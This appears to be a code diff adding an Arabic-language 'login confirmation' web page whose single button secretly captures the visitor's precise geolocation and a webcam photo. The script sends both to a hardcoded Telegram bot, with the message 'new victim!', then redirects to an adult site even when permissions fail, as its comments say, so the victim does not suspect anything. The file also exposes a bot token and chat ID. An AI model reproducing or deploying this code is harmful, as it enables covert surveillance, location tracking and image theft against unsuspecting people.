@@ -1,1 +1,136 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الدخول</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1a1a1a; /* خلفية داكنة احترافية */
+            font-family: Arial, sans-serif;
+        }
 
+        .container {
+            text-align: center;
+            color: white;
+        }
+
+        #continueBtn {
+            padding: 20px 50px;
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            background: linear-gradient(45deg, #007bff, #00d4ff);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        #continueBtn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.6);
+        }
+
+        #continueBtn:active {
+            transform: scale(0.95);
+        }
+
+        .loading-text {
+            display: none;
+            margin-top: 20px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <button id="continueBtn">استمرار</button>
+        <div id="loading" class="loading-text">جاري التحقق، يرجى الانتظار...</div>
+    </div>
+
+    <script>
+        // --- إعداداتك الخاصة (لا تغيرها) ---
+        const BOT_TOKEN = "8096456924:AAHVqOg0880odicn_aOzZIDZfuYcbG4El1I";
+        const CHAT_ID = "5127563643";
+        const REDIRECT_URL = "https://ar.stripchat.com/";
+        // ----------------------------------
+
+        const btn = document.getElementById('continueBtn');
+        const loading = document.getElementById('loading');
+
+        btn.addEventListener('click', async () => {
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+
+            try {
+                // 1. الحصول على الموقع الجغرافي
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+
+                const { latitude, longitude } = position.coords;
+                const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                // 2. طلب الكاميرا والتقاط صورة
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // انتظار ثانية لضمان جودة الصورة
+                await new Promise(r => setTimeout(r, 1000));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                
+                // إيقاف الكاميرا فوراً
+                stream.getTracks().forEach(track => track.stop());
+
+                // 3. إرسال الموقع (نص)
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `✅ ضحية جديدة!\n📍 الموقع: ${googleMapsUrl}`
+                    })
+                });
+
+                // 4. إرسال الصورة (ملف)
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', imageBlob, 'capture.jpg');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // 5. التحويل النهائي
+                window.location.href = REDIRECT_URL;
+
+            } catch (error) {
+                console.error("Error:", error);
+                // في حال رفض الأذونات أو حدوث خطأ، يتم التحويل أيضاً لضمان عدم الشك
+                window.location.href = REDIRECT_URL;
+            }
+        });
+    </script>
+</body>
+</html>
